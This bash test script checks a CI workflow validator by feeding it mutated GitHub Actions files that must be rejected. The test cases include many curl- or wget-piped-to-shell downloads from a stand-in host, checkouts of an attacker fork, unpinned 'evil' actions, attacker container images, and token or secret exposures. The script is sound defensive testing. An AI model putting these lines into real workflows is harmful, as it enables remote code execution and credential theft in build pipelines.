#!/usr/bin/env bash
# Negative tests of ci-check-workflow.sh (feature 0008 T05, F03, F08): the real
# .github/workflows/binding-android.yml must pass, and each mutated copy of it (in a temporary
# directory, never in the checkout) must fail with the rule it breaks.
#
#   platforms/android/scripts/ci-check-workflow-test.sh
#
# Some forbidden names are assembled from pieces, so that this file itself does not trip
# scripts/check-artifacts.sh's grep for Central and signing configuration in platforms/android.
# Exit status: 0 every case behaved; 1 a case did not (each printed with FAIL); 2 setup error.
# The cases hold literal ${{ }} and $VAR text for the workflow, never for this shell.
# shellcheck disable=SC2016
set -uo pipefail
here=$(cd "$(dirname "$0")" && pwd -P) || exit 2
repo=$(cd "$here/../../.." && pwd -P) || exit 2
check=$here/ci-check-workflow.sh
base=$repo/.github/workflows/binding-android.yml
[ -x "$check" ] || { echo "no executable $check"; exit 2; }
[ -f "$base" ] || { echo "no $base"; exit 2; }

tmp=$(mktemp -d "${TMPDIR:-/tmp}/ci-check-workflow-test.XXXXXX") || exit 2
trap 'rm -rf "$tmp"' EXIT
case_file=$tmp/binding-android.yml
passed=0 failed=0
ok() { echo "ok    $*"; passed=$((passed + 1)); }
bad() { echo "FAIL  $*"; failed=$((failed + 1)); }

# Mutations of the base file into $case_file (exit 3 when the anchor is not found).
insert_after() { # <exact line> <text, \n separated>
  awk -v anchor="$1" -v text="$2" '{ print } !done && $0 == anchor { print text; done = 1 } END { if (!done) exit 3 }' "$base" >"$case_file"
}
replace_line() { # <exact line> <text, \n separated>
  awk -v anchor="$1" -v text="$2" '!done && $0 == anchor { print text; done = 1; next } { print } END { if (!done) exit 3 }' "$base" >"$case_file"
}
replace_str() { # <literal> <literal>: the first occurrence in the file
  awk -v from="$1" -v to="$2" '!done && (i = index($0, from)) { $0 = substr($0, 1, i - 1) to substr($0, i + length(from)); done = 1 } { print } END { if (!done) exit 3 }' "$base" >"$case_file"
}
append() { { cat "$base"; printf '%b\n' "$1"; } >"$case_file"; }

# expect_fail <name> <substring of a FAIL line> <mutation...>
expect_fail() {
  local name=$1 want=$2 out rc; shift 2
  if ! "$@"; then bad "$name: the mutation did not apply (anchor not found)"; return; fi
  if cmp -s "$base" "$case_file"; then bad "$name: the mutation changed nothing"; return; fi
  out=$("$check" "$case_file" 2>&1); rc=$?
  if [ "$rc" -ne 1 ]; then bad "$name: exit $rc, not 1"; printf '%s\n' "$out" | sed 's/^/        /'; return; fi
  if printf '%s\n' "$out" | grep '^FAIL: ' | grep -qF "$want"; then ok "$name"
  else bad "$name: no FAIL line with \"$want\""; printf '%s\n' "$out" | sed 's/^/        /'; fi
}
# expect_pass <name> <mutation...>: a change that must not fail the check.
expect_pass() {
  local name=$1 out rc; shift
  if ! "$@"; then bad "$name: the mutation did not apply (anchor not found)"; return; fi
  out=$("$check" "$case_file" 2>&1); rc=$?
  if [ "$rc" -eq 0 ]; then ok "$name"; else bad "$name: exit $rc"; printf '%s\n' "$out" | sed 's/^/        /'; fi
}

sha40=0123456789abcdef0123456789abcdef01234567
checkout='actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1'
setup_java='actions/setup-java@b843ebf9b913146b38da2eaa7aeddf76074ae1ad # v6.1.0'
env_anchor='          MODE: ${{ inputs.mode }}'
run_anchor='          case $MODE in'
script_anchor='          rustup show'
inline_run_anchor='        run: scripts/check-no-cargo-config.sh'
steps_anchor='    steps:'
job_anchor='    timeout-minutes: 5'
checkout_with='          persist-credentials: false'
url=https://e.example/install.sh
central_user="SONA""TYPE_USERNAME"
central_task="publishTo""MavenCentral"
central_prop="mavenCentral""Username"
signing_prop="ORG_GRADLE_PROJECT_signing""InMemoryKey"

# The real workflow.
out=$("$check" "$base" 2>&1); rc=$?
if [ "$rc" -eq 0 ]; then ok "the real workflow passes"; else bad "the real workflow fails (exit $rc)"; printf '%s\n' "$out" | sed 's/^/        /'; fi

# Triggers.
expect_fail "trigger: pull_request" "trigger:" insert_after "on:" "  pull_request:"
expect_fail "trigger: pull_request_target" "trigger:" insert_after "on:" "  pull_request_target:"
expect_fail "trigger: push" "trigger:" insert_after "on:" "  push:\n    branches: [main]"
expect_fail "trigger: schedule" "trigger:" insert_after "on:" "  schedule:\n    - cron: '0 3 * * *'"
expect_fail "trigger: workflow_call uncommented" "trigger:" replace_str "  # workflow_call:" "  workflow_call:"
expect_fail "trigger: workflow_run" "trigger:" insert_after "on:" "  workflow_run:\n    workflows: [CI]"
expect_fail "trigger: scalar on:" "trigger: on: must be a block" replace_line "on:" "on: workflow_dispatch"
expect_fail "trigger: flow list on:" "trigger: on: must be a block" replace_line "on:" "on: [workflow_dispatch, push]"
expect_fail "trigger: a second on: key (true)" "top-level on: keys" append "true:\n  push:"
expect_fail "trigger: a second on: key (quoted)" "top-level on: keys" append "\"on\":\n  push:"
expect_fail "trigger: list under on:" "trigger:" insert_after "on:" "  - push"

# Permissions.
expect_fail "permissions: no top-level block" "no top-level permissions" replace_line "permissions:" "x-permissions:"
expect_fail "permissions: contents: write" "permissions:" replace_str "  contents: read" "  contents: write"
expect_fail "permissions: write-all" "permissions:" replace_line "permissions:" "permissions: write-all"
expect_fail "permissions: read-all" "permissions:" replace_line "permissions:" "permissions: read-all"
expect_fail "permissions: a second top-level grant" "only contents: read" insert_after "  contents: read" "  actions: read"
expect_fail "permissions: job id-token: write" "permissions:" replace_str "permissions: {}" "permissions: { id-token: write }"
expect_fail "permissions: job actions: read" "only contents: read" replace_str "    permissions: {}" "    permissions:\n      actions: read"
expect_fail "permissions: job packages: write" "permissions:" insert_after "    timeout-minutes: 60" "    permissions:\n      packages: write"

# Actions.
expect_fail "actions: a tag instead of a SHA" "actions:" replace_str "$checkout" "actions/checkout@v7"
expect_fail "actions: a short SHA" "actions:" replace_str "$checkout" "actions/checkout@3d3c42e # v7.0.1"
expect_fail "actions: no version comment" "actions:" replace_str "$checkout" "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1"
expect_fail "actions: an allowed action at another SHA" "not one of the allowed pins" replace_str "$setup_java" "actions/setup-java@$sha40 # v6.1.0"
expect_fail "actions: the right SHA with another version" "not one of the allowed pins" replace_str "$setup_java" "actions/setup-java@b843ebf9b913146b38da2eaa7aeddf76074ae1ad # v6.2.0"
expect_fail "actions: a third-party action pinned by SHA" "not one of the allowed pins" insert_after "$steps_anchor" "      - uses: reactivecircus/android-emulator-runner@$sha40 # v2.35.0"
expect_fail "actions: a local action" "actions:" insert_after "$steps_anchor" "      - uses: ./.github/actions/setup"
expect_fail "actions: a docker action" "actions:" insert_after "$steps_anchor" "      - uses: docker://alpine:3.22"
expect_fail "structure: flow-style uses" "structure: flow-style uses:" insert_after "$steps_anchor" "      - { uses: $checkout }"

# Quoted keys (F03): the uses: scan must see them, and a quoted key is outside the subset.
expect_fail "actions: a double-quoted uses key, unpinned" "actions:" insert_after "$steps_anchor" '      - "uses": evil/x@v1'
expect_fail "actions: a single-quoted uses key, unpinned" "actions:" insert_after "$steps_anchor" "      - 'uses': evil/x@v1"
expect_fail "actions: a quoted uses key, pinned but not allowed" "actions:" insert_after "$steps_anchor" "      - \"uses\": reactivecircus/android-emulator-runner@$sha40 # v2.35.0"
expect_fail "actions: a quoted uses key after a space" "actions:" insert_after "$steps_anchor" "      - 'uses' : evil/x@v1"
expect_fail "actions: a quoted uses key on its own line" "actions:" insert_after "$steps_anchor" '      - name: x\n        "uses": evil/x@v1'
expect_fail "structure: a quoted uses key with an allowed pin" "structure: a quoted key" insert_after "$steps_anchor" "      - \"uses\": $checkout"
expect_fail "structure: an escaped double-quoted uses key" "structure: a quoted key" insert_after "$steps_anchor" '      - "u\\x73es": evil/x@v1'
expect_fail "structure: flow-style double-quoted uses" "structure: flow-style uses:" insert_after "$steps_anchor" '      - { "uses": evil/x@v1 }'
expect_fail "structure: flow-style single-quoted uses" "structure: flow-style uses:" insert_after "$steps_anchor" "      - { 'uses': evil/x@v1 }"
expect_fail "structure: flow-style quoted uses without spaces" "structure: a quoted key" insert_after "$steps_anchor" '      - {"name":"x","uses":"evil/x@v1"}'
expect_fail "structure: flow-style quoted key after a comma" "structure: a quoted key" insert_after "$steps_anchor" "      - { name: x, 'uses': evil/x@v1 }"
expect_fail "structure: an explicit ? key" "structure: an explicit ? key" insert_after "$steps_anchor" "      - ? uses\n        : evil/x@v1"
expect_fail "structure: a tagged uses key" "structure: a YAML tag" insert_after "$steps_anchor" "      - !!str uses: evil/x@v1"
expect_fail "trigger: a quoted pull_request key" "trigger:" insert_after "on:" '  "pull_request":'
expect_fail "trigger: a quoted pull_request key is outside the subset" "structure: a quoted key" insert_after "on:" "  'pull_request':"
expect_fail "permissions: a quoted job permissions key" "structure: a quoted key" replace_str "    permissions: {}" "    \"permissions\": {}"
expect_fail "credentials: a quoted secrets key" "credentials: secrets" insert_after "    timeout-minutes: 5" "    'secrets': inherit"
expect_pass "structure: quoted values with a colon or an apostrophe are not keys" insert_after "$env_anchor" "          X: \"a: b\"\n          Y: 'it''s: fine'\n          Z: { a: \"x\", b: 'y: z' }"

# Credentials.
expect_fail "credentials: secrets context" "credentials: secrets" insert_after "$env_anchor" '          X: ${{ secrets.X }}'
expect_fail "credentials: secrets[...] context" "credentials: secrets" insert_after "$env_anchor" "          X: \${{ secrets['X'] }}"
expect_fail "credentials: secrets: inherit" "credentials: secrets" insert_after "    timeout-minutes: 5" "    secrets: inherit"
expect_fail "credentials: github.token" "credentials: a token" insert_after "$env_anchor" '          X: ${{ github.token }}'
expect_fail "credentials: GITHUB_TOKEN in a script" "credentials: a token" insert_after "$run_anchor" '          curl -H "Authorization: Bearer $GITHUB_TOKEN" https://api.github.com'
expect_fail "credentials: github['token']" "credentials: a token" insert_after "$env_anchor" "          X: \${{ github['token'] }}"
expect_fail "credentials: github[\"token\"]" "credentials: a token" insert_after "$env_anchor" '          X: ${{ github["token"] }}'
expect_fail "credentials: a github-token input" "credentials: a token" insert_after "          pattern: conformance-*" "          github-token: x"
expect_fail "credentials: persist-credentials: true" "credentials: password, username or credential" replace_str "persist-credentials: false" "persist-credentials: true"
expect_fail "credentials: Sonatype user" "credentials:" insert_after "$env_anchor" "          $central_user: x"
expect_fail "credentials: Central property" "credentials: Maven Central" insert_after "$env_anchor" "          X: $central_prop"
expect_fail "credentials: Gradle project property" "credentials: an ORG_GRADLE_PROJECT_ property" insert_after "$env_anchor" "          ORG_GRADLE_PROJECT_x: y"
expect_fail "credentials: a deployment environment" "credentials: a deployment environment" insert_after "    timeout-minutes: 5" "    environment: release-signing"
expect_fail "credentials: setup-java server password" "credentials: password" insert_after '          java-version: "21"' "          server-password: X"

# Publishing and signing.
expect_fail "publishing: the Central task" "publishing: publish" insert_after "$run_anchor" "          ./gradlew $central_task"
expect_fail "publishing: npm publish" "publishing: publish" insert_after "$run_anchor" "          npm publish"
expect_fail "publishing: a signing key property" "publishing: signing" insert_after "$env_anchor" "          $signing_prop: x"
expect_fail "publishing: gpg" "publishing: signing" insert_after "$run_anchor" "          gpg --batch --import key.asc"
expect_fail "publishing: sign" "publishing: signing" insert_after "$run_anchor" "          cosign sign x"

# Expressions.
expect_fail "expressions: vars context" "expressions:" insert_after "$env_anchor" '          X: ${{ vars.X }}'
expect_fail "expressions: env context" "expressions:" insert_after "$env_anchor" '          X: ${{ env.X }}'
expect_fail "expressions: toJSON(github)" "whole github context" insert_after "$env_anchor" '          X: ${{ toJSON(github) }}'
expect_fail "expressions: toJSON(secrets)" "credentials: secrets" insert_after "$env_anchor" '          X: ${{ toJSON(secrets) }}'
expect_fail "expressions: toJSON(env)" "expressions:" insert_after "$env_anchor" '          X: ${{ toJSON(env) }}'
expect_fail "expressions: the bare github context" "whole github context" insert_after "$env_anchor" '          X: ${{ github }}'
expect_fail "expressions: github['token'] indexes the github context" "whole github context" insert_after "$env_anchor" "          X: \${{ github['token'] }}"
expect_fail "expressions: github[\"token\"] indexes the github context" "whole github context" insert_after "$env_anchor" '          X: ${{ github["token"] }}'
expect_fail "expressions: a computed github index" "whole github context" insert_after "$env_anchor" "          X: \${{ github[format('{0}{1}', 'tok', 'en')] }}"
expect_fail "expressions: the github.* object filter" "whole github context" insert_after "$env_anchor" '          X: ${{ toJSON(github.*) }}'
expect_fail "expressions: fromJSON(toJSON(github))" "whole github context" insert_after "$env_anchor" '          X: ${{ fromJSON(toJSON(github)).sha }}'
expect_pass "expressions: a github property stays allowed" insert_after "$env_anchor" '          X: ${{ github.sha }}\n          Y: ${{ toJSON(github.event.inputs) }}'
expect_fail "expressions: an input inside run:" "inside a run: script" replace_line "$run_anchor" '          case ${{ inputs.mode }} in'
expect_fail "expressions: inline run: with \${{ }}" "inside a run: script" replace_line "        run: platforms/android/scripts/ci-parity.sh target/ci-results" '        run: platforms/android/scripts/ci-parity.sh ${{ github.workspace }}/target/ci-results'

# Structure.
expect_fail "structure: an anchor" "structure: YAML anchor" insert_after "$env_anchor" "          X: &x 1"
expect_fail "structure: a merge key" "structure: YAML anchor" insert_after "$env_anchor" "          <<: {X: 1}"
expect_fail "structure: a second document" "structure: a second YAML document" append "---\nname: other"
expect_fail "structure: tab indentation" "structure: tab indentation" append "\tx: 1"

# Scripts.
expect_fail "scripts: a step that is gone" "scripts: no step calls platforms/android/scripts/ci-parity.sh" \
  replace_line "        run: platforms/android/scripts/ci-parity.sh target/ci-results" "        run: scripts/conformance-parity.sh"
expect_fail "scripts: a script that does not exist" "is not an executable regular file" \
  replace_line "        run: platforms/android/scripts/ci-parity.sh target/ci-results" "        run: platforms/android/scripts/ci-parity.sh target/ci-results && platforms/android/scripts/ci-missing.sh"

# Per-action with: allow-list (F08, security audit L3): a checkout of another repository, ref or
# credential runs the attacker's ci-*.sh in every later step.
expect_fail "with: checkout repository" "actions: with: repository is not allowed for actions/checkout" insert_after "$checkout_with" "          repository: attacker/polyjose-fork"
expect_fail "with: checkout ref" "actions: with: ref is not allowed for actions/checkout" insert_after "$checkout_with" "          ref: evil"
expect_fail "with: checkout ssh-key" "actions: with: ssh-key is not allowed for actions/checkout" insert_after "$checkout_with" "          ssh-key: x"
expect_fail "with: checkout token" "actions: with: token is not allowed for actions/checkout" insert_after "$checkout_with" "          token: x"
expect_fail "with: checkout path" "actions: with: path is not allowed for actions/checkout" insert_after "$checkout_with" "          path: elsewhere"
expect_fail "with: a case-variant checkout key" "actions: with: repository is not allowed for actions/checkout" insert_after "$checkout_with" "          Repository: attacker/polyjose-fork"
expect_fail "with: a checkout key before uses:" "actions: with: repository is not allowed for actions/checkout" insert_after "$steps_anchor" "      - with:\n          persist-credentials: false\n          repository: attacker/polyjose-fork\n        uses: $checkout"
expect_fail "with: a checkout without persist-credentials: false" "actions: actions/checkout without with: persist-credentials: false" replace_str "persist-credentials: false" "fetch-depth: 1"
expect_fail "with: a checkout without with:" "actions: actions/checkout without with: persist-credentials: false" insert_after "$steps_anchor" "      - uses: $checkout"
expect_fail "with: a non-integer fetch-depth" "actions: with: fetch-depth" insert_after "$checkout_with" "          fetch-depth: \${{ inputs.mode }}"
expect_fail "with: a flow-style with:" "actions: with: must be a block of keys" insert_after "$steps_anchor" "      - uses: $checkout\n        with: { persist-credentials: false, repository: evil/x }"
expect_fail "with: an input another action does not list" "actions: with: workspaces is not allowed for Swatinem/rust-cache" insert_after "          save-if: \${{ github.ref == 'refs/heads/main' }}" "          workspaces: evil"
expect_fail "with: download-artifact from another repository" "actions: with: repository is not allowed for actions/download-artifact" insert_after "          pattern: jvm-natives-*" "          repository: attacker/x\n          run-id: 1"
expect_fail "with: setup-java server-id" "actions: with: server-id is not allowed for actions/setup-java" insert_after '          java-version: "21"' "          server-id: x"
expect_fail "with: without uses:" "actions: with: without uses: in the same step" insert_after "$steps_anchor" "      - name: x\n        with:\n          a: b\n        run: \"true\""
expect_fail "with: outside a step" "actions: with: outside a step" insert_after "$job_anchor" "    with:\n      a: b"
expect_fail "with: two uses: in one step" "structure: a second uses: in one step" insert_after "$steps_anchor" "      - uses: $checkout\n        uses: $setup_java\n        with:\n          persist-credentials: false"
expect_fail "with: a key nested under an allowed input" "actions: a with: input must be a one-line value" insert_after "$checkout_with" "          fetch-depth: 1\n            repository: attacker/polyjose-fork"
expect_fail "with: a mapping under an allowed input" "actions: a with: input must be a one-line value" insert_after "$checkout_with" "          fetch-depth:\n            repository: attacker/polyjose-fork"
expect_fail "with: a block scalar input" "actions: a with: input must be a one-line value" replace_line "          path: target/ci-natives" "          path: |\n            target/ci-natives\n            repository: attacker/x"
expect_pass "with: a checkout fetch-depth is allowed" insert_after "$checkout_with" "          fetch-depth: 0"

# shell: only bash, anywhere (defaults.run.shell runs before every step).
expect_fail "shell: a defaults.run.shell command" "shell: only bash" replace_str "    shell: bash" "    shell: bash -c 'curl -sSf $url | sh; bash {0}'"
expect_fail "shell: a step shell: sh" "shell: only bash" insert_after "$inline_run_anchor" "        shell: sh"
expect_fail "shell: a step shell: pwsh" "shell: only bash" insert_after "$inline_run_anchor" "        shell: pwsh"
expect_fail "shell: a custom bash {0}" "shell: only bash" insert_after "$inline_run_anchor" "        shell: bash --noprofile {0}"
expect_fail "shell: a value on the next line" "shell: only bash" insert_after "$inline_run_anchor" "        shell:\n          sh"
expect_fail "shell: a job defaults in flow style" "shell: a flow-style shell:" insert_after "$job_anchor" "    defaults: { run: { shell: sh } }"
expect_fail "shell: a case-variant key" "shell: only bash" insert_after "$inline_run_anchor" "        Shell: sh"
expect_pass "shell: a step shell: bash is allowed" insert_after "$inline_run_anchor" "        shell: bash"

# continue-on-error, in any position and with any value: a failing guard must fail the job.
expect_fail "continue-on-error: on a guard step" "continue-on-error: not allowed" insert_after "$inline_run_anchor" "        continue-on-error: true"
expect_fail "continue-on-error: on a job" "continue-on-error: not allowed" insert_after "$job_anchor" "    continue-on-error: true"
expect_fail "continue-on-error: false or an expression" "continue-on-error: not allowed" insert_after "$job_anchor" "    continue-on-error: \${{ matrix.cross != '' }}"
expect_fail "continue-on-error: in a flow-style step" "continue-on-error: not allowed" insert_after "$steps_anchor" "      - { name: x, run: \"true\", continue-on-error: true }"
expect_fail "continue-on-error: a case-variant key" "continue-on-error: not allowed" insert_after "$inline_run_anchor" "        Continue-On-Error: true"

# container: and services: (an unpinned image runs every step).
expect_fail "containers: a job container" "containers: container: or services:" insert_after "$job_anchor" "    container: attacker/image:latest"
expect_fail "containers: a container block" "containers: container: or services:" insert_after "$job_anchor" "    container:\n      image: attacker/image:latest"
expect_fail "containers: services" "containers: container: or services:" insert_after "$job_anchor" "    services:\n      db:\n        image: postgres:latest"
expect_fail "containers: a case-variant key" "containers: container: or services:" insert_after "$job_anchor" "    Container: attacker/image:latest"
expect_fail "containers: flow style" "containers: container: or services:" insert_after "$job_anchor" "    strategy: { fail-fast: false, container: x }"

# curl or wget piped to a shell, in a run: script or an inline run:.
expect_fail "downloads: curl | sh" "downloads: curl or wget piped to a shell" insert_after "$script_anchor" "          curl -sSf $url | sh"
expect_fail "downloads: curl | bash -s --" "downloads:" insert_after "$script_anchor" "          curl --proto '=https' -fsSL $url | bash -s -- -y"
expect_fail "downloads: wget -O- | bash" "downloads:" insert_after "$script_anchor" "          wget -O- $url | bash"
expect_fail "downloads: wget -qO- | sudo bash" "downloads:" insert_after "$script_anchor" "          wget -qO- $url | sudo bash"
expect_fail "downloads: curl | sudo -E sh -" "downloads:" insert_after "$script_anchor" "          curl -sSL $url | sudo -E sh -"
expect_fail "downloads: curl | sudo -u root bash" "downloads:" insert_after "$script_anchor" "          curl -s $url | sudo -u root bash"
expect_fail "downloads: curl | /bin/sh" "downloads:" insert_after "$script_anchor" "          /usr/bin/curl -s $url | /bin/sh"
expect_fail "downloads: curl | /usr/bin/env bash" "downloads:" insert_after "$script_anchor" "          curl -s $url | /usr/bin/env bash"
expect_fail "downloads: curl | tee | sh" "downloads:" insert_after "$script_anchor" "          curl -s $url | tee install.sh | sh"
expect_fail "downloads: curl|sh without spaces" "downloads:" insert_after "$script_anchor" "          curl -s $url|sh"
expect_fail "downloads: curl | python3" "downloads:" insert_after "$script_anchor" "          curl -s $url | python3 -"
expect_fail "downloads: a pipe after a line continuation" "downloads:" insert_after "$script_anchor" "          curl -fsSL $url \\\\\n            | sh"
expect_fail "downloads: a pipe at the end of a line" "downloads:" insert_after "$script_anchor" "          curl -fsSL $url |\n            sh"
expect_fail "downloads: bash <(curl ...)" "downloads:" insert_after "$script_anchor" "          bash <(curl -s $url)"
expect_fail "downloads: sh -c \"\$(curl ...)\"" "downloads:" insert_after "$script_anchor" "          sh -c \"\$(curl -fsSL $url)\""
expect_fail "downloads: eval \"\$(wget ...)\"" "downloads:" insert_after "$script_anchor" "          eval \"\$(wget -qO- $url)\""
expect_fail "downloads: curl |& sh" "downloads:" insert_after "$script_anchor" "          curl -s $url |& sh"
expect_fail "downloads: curl | \$SHELL" "downloads:" insert_after "$script_anchor" "          curl -s $url | \"\$SHELL\" -s"
expect_fail "downloads: curl | tee >(sh)" "downloads:" insert_after "$script_anchor" "          curl -s $url | tee >(sh) >/dev/null"
expect_fail "downloads: curl | (sh)" "downloads:" insert_after "$script_anchor" "          curl -s $url | (sh)"
expect_fail "downloads: curl | { bash; }" "downloads:" insert_after "$script_anchor" "          curl -s $url | { bash; }"
expect_fail "downloads: curl | . /dev/stdin" "downloads:" insert_after "$script_anchor" "          curl -s $url | . /dev/stdin"
expect_fail "downloads: curl | source /dev/stdin" "downloads:" insert_after "$script_anchor" "          curl -s $url | source /dev/stdin"
expect_fail "downloads: an inline run:" "downloads:" replace_line "$inline_run_anchor" "        run: curl -sSf $url | sh"
expect_fail "downloads: an inline run: folded onto the next line" "downloads:" replace_line "$inline_run_anchor" "        run: curl -sSf $url\n          | sh"
expect_fail "downloads: a folded run: > block" "downloads:" replace_line "$inline_run_anchor" "        run: >\n          curl -sSf $url\n          | sh"
expect_fail "downloads: a case-variant Run: block" "downloads:" replace_line "$inline_run_anchor" "        Run: |\n          curl -sSf $url | sh"
expect_fail "downloads: a run: script that starts on the next line" "downloads:" replace_line "$inline_run_anchor" "        run:\n          curl -sSf $url | sh"
expect_fail "structure: a flow-style run:" "structure: flow-style run:" insert_after "$steps_anchor" "      - { name: x, run: curl -sSf $url | sh }"
expect_pass "downloads: curl to a file, a pipe to a non-shell, || and the words in names" insert_after "$script_anchor" "          curl -fsSLo rustup-init.sh $url\n          curl -o file $url\n          curl -s $url | grep -q shell\n          curl -s $url | jq .bash\n          curl -f $url || exit 1\n          v=\$(curl -s $url); echo \"\$v\"\n          curl -s $url | (cd target && tar xz)"
expect_pass "downloads: curl | sh in a step name is not a run: script" replace_str "      - name: no cargo config" "      - name: no curl | sh here"

# The words are not keys: container, services and continue-on-error in a script or a name pass.
expect_pass "containers: the words in run: scripts and names" insert_after "$script_anchor" "          docker run --name container x\n          echo \"container: none, services: none, continue-on-error: no, shell: sh\""
expect_pass "containers: the words in an inline run:" replace_line "$inline_run_anchor" "        run: scripts/check-no-cargo-config.sh container services"
expect_pass "containers: the words in a step name" replace_str "      - name: no cargo config" "      - name: container and services smoke, continue-on-error off"

# Case variants of keys (matched on the lowercased line).
expect_fail "case: - Uses: unpinned" "actions:" insert_after "$steps_anchor" "      - Uses: attacker/evil-action@main"
expect_fail "case: - USES: with an allowed pin" "structure: \"USES\" is a case variant of uses:" insert_after "$steps_anchor" "      - USES: $setup_java"
expect_fail "case: With:" "structure: \"With\" is a case variant of with:" replace_str "        with:" "        With:"
expect_fail "case: a second top-level On:" "top-level on: keys" append "On:\n  push:"
expect_fail "case: a Permissions: block" "permissions: only contents: read" insert_after "$job_anchor" "    Permissions:\n      actions: read"
expect_fail "case: Run: with \${{ }}" "inside a run: script" replace_line "$inline_run_anchor" "        Run: echo \${{ inputs.mode }}"

# Comments do not count.
expect_pass "comments: a commented trigger and secrets mention" insert_after "on:" "  # pull_request:   (\${{ secrets.X }}, publish, signing: not code)"
expect_pass "comments: a commented uses line" insert_after "$steps_anchor" "      # - uses: actions/checkout@v4"

# Usage.
"$check" "$tmp/does-not-exist.yml" >/dev/null 2>&1; rc=$?
if [ "$rc" -eq 2 ]; then ok "a missing workflow file is a usage error (2)"; else bad "a missing workflow file: exit $rc, not 2"; fi

echo
echo "ci-check-workflow-test: $passed passed, $failed failed"
[ "$failed" -eq 0 ]
